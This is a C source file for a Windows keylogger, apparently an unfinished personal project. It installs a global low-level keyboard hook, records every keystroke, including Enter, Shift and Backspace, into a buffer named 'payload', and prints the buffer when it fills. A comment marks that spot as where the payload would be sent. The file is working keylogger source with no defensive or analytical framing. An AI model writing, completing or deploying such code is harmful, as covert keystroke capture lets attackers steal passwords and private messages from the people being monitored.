#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

char payload[50] =  {0};


LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
{
	
	if(nCode < 0)
	{
		return(CallNextHookEx(NULL, nCode, wParam, lParam));
	}

	if(wParam == WM_KEYDOWN)
	{
		const KBDLLHOOKSTRUCT *p = (const KBDLLHOOKSTRUCT *)lParam;
		UINT virtualKey = p->vkCode;
		UINT letter = MapVirtualKeyA(virtualKey, 2);
		char charAppend[12] = {0};

		//if the letter is a letter than append it to the payload

		//if its not a recognized letter than just use the special cases and append to payload

		//make sure to check that payload doesnt exceed ~50 chars(thats about a sentence)

		if(letter != 0){
			charAppend[0] = (char)letter;
		}else{
			switch(virtualKey)
			{
				
				case VK_RETURN:
					strcpy(charAppend, "<ENTER>");
					break;
				case VK_ESCAPE:
					strcpy(charAppend, "<ESCAPE>");
					break;
				case VK_LSHIFT:
					strcpy(charAppend, "<SHIFT>");
					break;
				case VK_BACK:
					strcpy(charAppend, "<BACKSPACE>");
					break;
				case VK_SPACE:
					strcpy(charAppend, "<SPACE>");
					break;
			}
		}

		size_t payloadSize = strlen(payload);
		
		if((payloadSize + strlen(charAppend)) < 50){
			strcat(payload, charAppend);
			memset(charAppend, '\0', sizeof(charAppend));
			//WAIT, IF IT DOESNT HAVE SPACE IT JUST IGNORES THE BUFFER!?!! WE MIGTH NEED SWITCH CASE FOR THIS

			//figure out how to append strings, maybe for loops based off of lens of added chars and strings
			//add char or string until done with payload.
		}else if(payloadSize > 48){
			//send the payload
			printf("%s\n", payload);
			memset(payload, '\0', sizeof(payload));
		}


		/*
		char realLetter;
		realLetter = (char)letter;
		char specialLetter[20];
		char prettyOutput[50][20];
		uint8_t prettyCounter = 0;

		if(prettyCounter < 20 && specialLetter[0] != '\0'){
			printf("%s%u\n", "prettyCounter added, now at:\t", prettyCounter);
			strcpy(prettyOutput[prettyCounter],  specialLetter);
			printf("The special added is:\t%s", prettyOutput[prettyCounter]);
			prettyCounter++;
		}else if(prettyCounter < 20){
			prettyOutput[prettyCounter][0] = realLetter;
			prettyCounter++;
		}else
		{
			printf("prettyOutput:\t");

			for (size_t k = 0; k < prettyCounter; k++)
			{
    			printf("%s", prettyOutput[k]);
			}

			prettyCounter = 0;

			for(uint8_t i = 0; i < sizeof(prettyOutput); i++)
			{
				for(uint8_t j = 0; j < sizeof(prettyOutput[i]); j++)
				{
					prettyOutput[i][j] = '\0';
				}
			}
		}
		*/

		//printf("Key was pressed!\n");
		/*
		if(specialLetter[0] == '\0')
		{
			printf("Letter(normal):\t%c\t", letter);
			printf("Code(normal)\t%u\t\n\n", letter);
		}
		else
		{
			printf("Letter(special):\t%s\t", specialLetter);
		}
		*/

	}


	return(CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main()
{
	HHOOK hhook =  SetWindowsHookExA(WH_KEYBOARD_LL, stuff, NULL, 0);
	if(hhook == NULL){
		printf("Hook wasn't installed");
	}else{
		printf("Hook was installed");
	}
	
	MSG msg;
	while((GetMessage(&msg, NULL, WM_KEYFIRST, WM_KEYFIRST)) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}